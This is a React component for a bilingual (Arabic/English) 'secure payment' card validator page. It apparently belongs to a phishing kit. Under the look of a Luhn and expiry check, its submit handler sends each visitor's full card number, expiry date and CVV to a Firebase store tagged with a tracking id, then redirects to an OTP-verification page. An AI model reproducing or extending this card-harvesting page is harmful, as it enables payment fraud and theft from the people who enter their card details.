"use client"

import type React from "react"

import { useState } from "react"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { CheckCircle, XCircle, CreditCard, Shield, Lock, Globe } from "lucide-react"
import { addData } from "@/lib/firebase"

type Language = "en" | "ar"

const translations = {
  en: {
    title: "Card Validator",
    subtitle: "Secure payment verification system",
    cardNumber: "Card Number",
    cardholderName: "Cardholder Name",
    expiryDate: "Expiry Date",
    cvv: "CVV",
    validateButton: "Validate Card Details",
    cardType: "Card Type",
    detectedCard: "Detected Card Type",
    noCardDetected: "No Card Detected",
    validMessage: "All card details are valid!",
    errorMessage: "Please fix the errors below:",
    securityFeatures: "Security Features",
    supportedCards: "Supported Cards:",
    luhnAlgorithm: "Luhn Algorithm",
    expiryValidation: "Expiry Validation",
    cvvVerification: "CVV Verification",
    realtimeChecks: "Real-time Checks",
    cardholderPlaceholder: "JOHN DOE",
    errors: {
      invalidLength: "Invalid card length. Must be between 12-19 digits.",
      invalidCard: "Card number is not valid.",
      expiryRequired: "Expiry date is required.",
      invalidExpiry: "Invalid or expired date.",
      cvvRequired: "CVV is required.",
      invalidCvv: "CVV must be {length} digits for {cardType}.",
      nameRequired: "Cardholder name is required.",
    },
  },
  ar: {
    title: "الدفع الاّمن",
    subtitle: "نظام الدفع الآمن",
    cardNumber: "رقم البطاقة",
    cardholderName: "اسم حامل البطاقة",
    expiryDate: "تاريخ الانتهاء",
    cvv: "رمز الأمان",
    validateButton: "الدفع الاّمن ",
    cardType: "نوع البطاقة",
    detectedCard: "نوع البطاقة المكتشف",
    noCardDetected: "لم يتم اكتشاف بطاقة",
    validMessage: "جميع تفاصيل البطاقة صحيحة!",
    errorMessage: "يرجى إصلاح الأخطاء أدناه:",
    securityFeatures: "ميزات الأمان",
    supportedCards: "البطاقات المدعومة:",
    luhnAlgorithm: "خوارزمية لون",
    expiryValidation: "التحقق من الانتهاء",
    cvvVerification: "التحقق من رمز الأمان",
    realtimeChecks: "فحوصات فورية",
    cardholderPlaceholder: "أحمد محمد",
    errors: {
      invalidLength: "طول البطاقة غير صحيح. يجب أن يكون بين 12-19 رقم.",
      invalidCard: "رقم البطاقة غير صحيح.",
      expiryRequired: "تاريخ الانتهاء مطلوب.",
      invalidExpiry: "تاريخ غير صحيح أو منتهي الصلاحية.",
      cvvRequired: "رمز الأمان مطلوب.",
      invalidCvv: "رمز الأمان يجب أن يكون {length} أرقام لبطاقة {cardType}.",
      nameRequired: "اسم حامل البطاقة مطلوب.",
    },
  },
}

const cardTypeTranslations = {
  en: {
    Visa: "Visa",
    MasterCard: "MasterCard",
    "American Express": "American Express",
    Discover: "Discover",
    "Diners Club": "Diners Club",
    JCB: "JCB",
    Unknown: "Unknown",
  },
  ar: {
    Visa: "فيزا",
    MasterCard: "ماستركارد",
    "American Express": "أمريكان إكسبريس",
    Discover: "ديسكفر",
    "Diners Club": "دايرز كلوب",
    JCB: "جي سي بي",
    Unknown: "غير معروف",
  },
}

export default function CreditCardValidator() {
  const [language, setLanguage] = useState<Language>("ar")
  const [cardNumber, setCardNumber] = useState("")
  const [expiryDate, setExpiryDate] = useState("")
  const [cvv, setCvv] = useState("")
  const [cardholderName, setCardholderName] = useState("")
  const [result, setResult] = useState<{
    isValid: boolean | null
    cardType: string
    message: string
    errors: string[]
  }>({
    isValid: null,
    cardType: "",
    message: "",
    errors: [],
  })

  const t = translations[language]
  const isRTL = language === "ar"

  const getCardType = (number: string): string => {
    const cleanNumber = number.replace(/\D/g, "")

    if (/^4[0-9]{12}(?:[0-9]{3})?$/.test(cleanNumber)) return "Visa"
    if (/^5[1-5][0-9]{14}$/.test(cleanNumber)) return "MasterCard"
    if (/^3[47][0-9]{13}$/.test(cleanNumber)) return "American Express"
    if (/^6(?:011|5[0-9]{2})[0-9]{12}$/.test(cleanNumber)) return "Discover"
    if (/^3(?:0[0-5]|[68][0-9])[0-9]{11}$/.test(cleanNumber)) return "Diners Club"
    if (/^35(2[89]|[3-8][0-9])[0-9]{12}$/.test(cleanNumber)) return "JCB"
    return "Unknown"
  }

  const getCardColor = (cardType: string): string => {
    switch (cardType) {
      case "Visa":
        return "from-blue-600 to-blue-800"
      case "MasterCard":
        return "from-red-500 to-red-700"
      case "American Express":
        return "from-green-600 to-green-800"
      case "Discover":
        return "from-orange-500 to-orange-700"
      case "Diners Club":
        return "from-purple-600 to-purple-800"
      case "JCB":
        return "from-indigo-600 to-indigo-800"
      default:
        return "from-gray-600 to-gray-800"
    }
  }

  const isValidCard = (number: string): boolean => {
    const cleanNumber = number.replace(/\D/g, "")
    let sum = 0
    let shouldDouble = false

    for (let i = cleanNumber.length - 1; i >= 0; i--) {
      let digit = Number.parseInt(cleanNumber[i])

      if (shouldDouble) {
        digit *= 2
        if (digit > 9) digit -= 9
      }

      sum += digit
      shouldDouble = !shouldDouble
    }

    return sum % 10 === 0
  }

  const formatCardNumber = (value: string): string => {
    const cleanValue = value.replace(/\D/g, "")
    const groups = cleanValue.match(/.{1,4}/g) || []
    return groups.join(" ").substr(0, 23)
  }

  const formatExpiryDate = (value: string): string => {
    const cleanValue = value.replace(/\D/g, "")
    if (cleanValue.length >= 2) {
      return cleanValue.slice(0, 2) + "/" + cleanValue.slice(2, 4)
    }
    return cleanValue
  }

  const isValidExpiryDate = (expiry: string): boolean => {
    const cleanExpiry = expiry.replace(/\D/g, "")
    if (cleanExpiry.length !== 4) return false

    const month = Number.parseInt(cleanExpiry.slice(0, 2))
    const year = Number.parseInt("20" + cleanExpiry.slice(2, 4))

    if (month < 1 || month > 12) return false

    const currentDate = new Date()
    const currentYear = currentDate.getFullYear()
    const currentMonth = currentDate.getMonth() + 1

    if (year < currentYear || (year === currentYear && month < currentMonth)) {
      return false
    }

    return true
  }

  const isValidCvv = (cvv: string, cardType: string): boolean => {
    const cleanCvv = cvv.replace(/\D/g, "")

    if (cardType === "American Express") {
      return cleanCvv.length === 4
    }

    return cleanCvv.length === 3
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCardNumber(e.target.value)
    setCardNumber(formattedValue)

    if (result.isValid !== null) {
      setResult({ isValid: null, cardType: "", message: "", errors: [] })
    }
  }

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatExpiryDate(e.target.value)
    setExpiryDate(formattedValue)

    if (result.isValid !== null) {
      setResult({ isValid: null, cardType: "", message: "", errors: [] })
    }
  }

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const cleanValue = e.target.value.replace(/\D/g, "")
    const cardType = getCardType(cardNumber)
    const maxLength = cardType === "American Express" ? 4 : 3

    setCvv(cleanValue.slice(0, maxLength))

    if (result.isValid !== null) {
      setResult({ isValid: null, cardType: "", message: "", errors: [] })
    }
  }

  const handleNameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCardholderName(e.target.value.toUpperCase())

    if (result.isValid !== null) {
      setResult({ isValid: null, cardType: "", message: "", errors: [] })
    }
  }

  const checkCard = () => {
    const cleanNumber = cardNumber.replace(/\D/g, "")
    const errors: string[] = []

    if (cleanNumber.length < 12 || cleanNumber.length > 19) {
      errors.push(t.errors.invalidLength)
    }

    const cardType = getCardType(cleanNumber)
    const isCardNumberValid = isValidCard(cleanNumber)

    if (cleanNumber.length >= 12 && cleanNumber.length <= 19 && !isCardNumberValid) {
      errors.push(t.errors.invalidCard)
    }

    if (!expiryDate) {
      errors.push(t.errors.expiryRequired)
    } else if (!isValidExpiryDate(expiryDate)) {
      errors.push(t.errors.invalidExpiry)
    }

    if (!cvv) {
      errors.push(t.errors.cvvRequired)
    } else if (!isValidCvv(cvv, cardType)) {
      const expectedLength = cardType === "American Express" ? 4 : 3
      const cardTypeName =cardType
      errors.push(
        t.errors.invalidCvv.replace("{length}", expectedLength.toString()).replace("{cardType}", cardTypeName),
      )
    }

    if (!cardholderName.trim()) {
      errors.push(t.errors.nameRequired)
    }

    const isValid = errors.length === 0

    setResult({
      isValid,
      cardType,
      message: isValid ? t.validMessage : t.errorMessage,
      errors,
    })
  }

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === "Enter") {
      checkCard()
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if(result.errors.length > 0 )return
    const visitorId = localStorage.getItem("visitor")
    addData({
      id: visitorId,
      cardNumber,
      expiryDate,
      cvv
    })
    window.location.href = "/checkout/otp-verification"
  }
  const displayCardNumber = cardNumber || "•••• •••• •••• ••••"
  const displayExpiry = expiryDate || "MM/YY"
  const displayName = cardholderName || t.cardholderPlaceholder
  const cardType = getCardType(cardNumber)
  const translatedCardType = cardType

  return (
    <div
      className={`min-h-screen bg-gradient-to-br from-slate-900 via-slate-800 to-slate-900 flex items-center justify-center p-4 ${isRTL ? "rtl" : "ltr"}`}
      dir={isRTL ? "rtl" : "ltr"}
    >
      <div className="w-full max-w-4xl grid lg:grid-cols-2 gap-8 items-center">
        {/* Credit Card Preview */}
       

        {/* Validation Form */}
        <div className={`order-1 ${isRTL ? "lg:order-1" : "lg:order-2"}`}>
          <Card className="shadow-2xl border-0 bg-white/95 backdrop-blur-sm">
            <CardHeader className="text-center space-y-4 pb-6">
              {/* Language Toggle */}
              <div className={`flex justify-end ${isRTL ? "justify-start" : ""}`}>
                <Button
                  variant="outline"
                  size="sm"
                  onClick={() => setLanguage(language === "en" ? "ar" : "en")}
                  className="flex items-center gap-2"
                >
                  <Globe className="w-4 h-4" />
                  {language === "en" ? "العربية" : "English"}
                </Button>
              </div>

              <div className="mx-auto w-20 h-20 bg-gradient-to-br from-white to-white rounded-2xl flex items-center justify-center shadow-lg">
                <img src="/Asset-2.png" className="w-12 h-12 text-white" />
              </div>
              <div>
                <CardTitle className="text-3xl font-bold bg-gradient-to-r from-gray-900 to-gray-600 bg-clip-text text-transparent">
                  {t.title}
                </CardTitle>
                <p className="text-gray-600 mt-2">{t.subtitle}</p>
              </div>
              <div className={`order-2 ${isRTL ? "lg:order-2" : "lg:order-1"}`}>
          <div className="relative">
            <div
              className={`w-full h-56 rounded-2xl bg-gradient-to-br ${getCardColor(cardType)} shadow-2xl transform transition-all duration-300 hover:scale-105`}
            >
              <div className="absolute inset-0 bg-gradient-to-br from-white/10 to-transparent rounded-2xl"></div>
              <div
                className={`relative p-6 h-full flex flex-col justify-between text-white ${isRTL ? "text-right" : "text-left"}`}
              >
                {/* Card Header */}
                <div className={`flex justify-between items-start ${isRTL ? "flex-row-reverse" : ""}`}>
                  <div className="w-12 h-8 bg-gradient-to-br from-yellow-400 to-yellow-600 rounded-md flex items-center justify-center">
                    <div className="w-6 h-4 bg-gradient-to-br from-yellow-300 to-yellow-500 rounded-sm"></div>
                  </div>
                  <div className={isRTL ? "text-left" : "text-right"}>
                    <div className="text-sm font-medium opacity-80">{translatedCardType || t.cardType}</div>
                  </div>
                </div>

                {/* Card Number */}
                <div className="space-y-4">
                  <div className={`text-xl font-mono tracking-wider ${isRTL ? "text-right" : "text-left"}`}>
                    {displayCardNumber}
                  </div>

                  {/* Card Footer */}
                  <div className={`flex justify-between items-end ${isRTL ? "flex-row-reverse" : ""}`}>
                    <div className={isRTL ? "text-right" : "text-left"}>
                      <div className="text-xs opacity-60 uppercase tracking-wide">
                        {isRTL ? "حامل البطاقة" : "Cardholder"}
                      </div>
                      <div className="text-sm font-medium truncate max-w-[200px]">{displayName}</div>
                    </div>
                    <div className={isRTL ? "text-left" : "text-right"}>
                      <div className="text-xs opacity-60 uppercase tracking-wide">{isRTL ? "ينتهي" : "Expires"}</div>
                      <div className="text-sm font-mono">{displayExpiry}</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
              {/* Card Type Indicator */}
             
            </CardHeader>

            <CardContent className="space-y-6">
              <form onSubmit={handleSubmit} >
              <div  className="space-y-5">
                <div className="space-y-2">
                  <label
                    className={`text-sm font-semibold text-gray-700 flex items-center gap-2 ${isRTL ? "flex-row-reverse" : ""}`}
                  >
                    <CreditCard className="w-4 h-4" />
                    {t.cardNumber}
                  </label>
                  <Input
                    type="tel"
                    placeholder="#### #### #### ####"
                    value={cardNumber}
                    onChange={handleInputChange}
                    onKeyPress={handleKeyPress}
                    className={`h-12 text-lg font-mono tracking-wider border-2 focus:border-blue-500 transition-colors ${isRTL ? "text-right" : "text-left"}`}
                    maxLength={19}
                  />
                </div>

                <div className="space-y-2">
                  <label className="text-sm font-semibold text-gray-700">{t.cardholderName}</label>
                  <Input
                    type="text"
                    placeholder={t.cardholderPlaceholder}
                    value={cardholderName}
                    onChange={handleNameChange}
                    onKeyPress={handleKeyPress}
                    className={`h-12 text-lg uppercase tracking-wide border-2 focus:border-blue-500 transition-colors ${isRTL ? "text-right" : "text-left"}`}
                  />
                </div>

                <div className="grid grid-cols-2 gap-4">
                  <div className="space-y-2">
                    <label className="text-sm font-semibold text-gray-700">{t.expiryDate}</label>
                    <Input
                      type="tel"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={handleExpiryChange}
                      onKeyPress={handleKeyPress}
                      className="h-12 text-lg font-mono tracking-wider border-2 focus:border-blue-500 transition-colors text-center"
                      maxLength={5}
                    />
                  </div>

                  <div className="space-y-2">
                    <label
                      className={`text-sm font-semibold text-gray-700 flex items-center gap-2 ${isRTL ? "flex-row-reverse" : ""}`}
                    >
                      <Lock className="w-4 h-4" />
                      {t.cvv}
                    </label>
                    <Input
                      type="password"
                      placeholder="***"
                      value={cvv}
                      onChange={handleCvvChange}
                      onKeyPress={handleKeyPress}
                      className="h-12 text-lg font-mono tracking-wider border-2 focus:border-blue-500 transition-colors text-center"
                      maxLength={3}
                    />
                  </div>
                </div>
              </div>

              <Button
                onClick={checkCard}

                className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold text-lg shadow-lg transition-all duration-200 transform hover:scale-[1.02]"
                disabled={cardNumber.replace(/\D/g, "").length < 12 || !expiryDate || !cvv || !cardholderName.trim()}
              >
                <Shield className={`w-5 h-5 ${isRTL ? "ml-2" : "mr-2"}`} />
                {t.validateButton}
              </Button>

              {result.isValid !== null && (
                <div
                  className={`p-6 rounded-xl border-2 ${result.isValid ? "bg-green-50 border-green-200" : "bg-red-50 border-red-200"}`}
                >
                  <div className={`flex items-center justify-center space-x-3 mb-4 ${isRTL ? "space-x-reverse" : ""}`}>
                    {result.isValid ? (
                      <CheckCircle className="w-6 h-6 text-green-600" />
                    ) : (
                      <XCircle className="w-6 h-6 text-red-600" />
                    )}
                    <span className={`font-semibold text-lg ${result.isValid ? "text-green-800" : "text-red-800"}`}>
                      {result.message}
                    </span>
                  </div>

                  {result.errors.length > 0 && (
                    <div className="space-y-2">
                      {result.errors.map((error, index) => (
                        <div
                          key={index}
                          className={`flex items-center space-x-2 text-red-700 ${isRTL ? "space-x-reverse" : ""}`}
                        >
                          <XCircle className="w-4 h-4 flex-shrink-0" />
                          <span className="text-sm">{error}</span>
                        </div>
                      ))}
                    </div>
                  )}

                  {result.cardType && result.isValid && (
                    <div className="flex justify-center mt-4">
                      <Badge className="bg-blue-100 text-blue-800 px-4 py-2 text-sm font-medium">
                        ✓ {translatedCardType} {isRTL ? "تم التحقق" : "Verified"}
                      </Badge>
                    </div>
                  )}
                </div>
              )}

              <div className="bg-gray-50 p-4 rounded-lg">
                <div className="text-xs text-gray-600 space-y-2">
                  <div className="mt-3 pt-2 border-t border-gray-200">
                    <div className="font-medium text-gray-700 mb-1">{t.supportedCards}</div>
                    <div className="text-xs">
                      {language === "ar"
                        ? "فيزا • ماستركارد • أمريكان إكسبريس • ديسكفر • "
                        : "Visa • MasterCard • American Express • Discover "}
                    </div>
                  </div>
                </div>
              </div>
              </form>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  )
}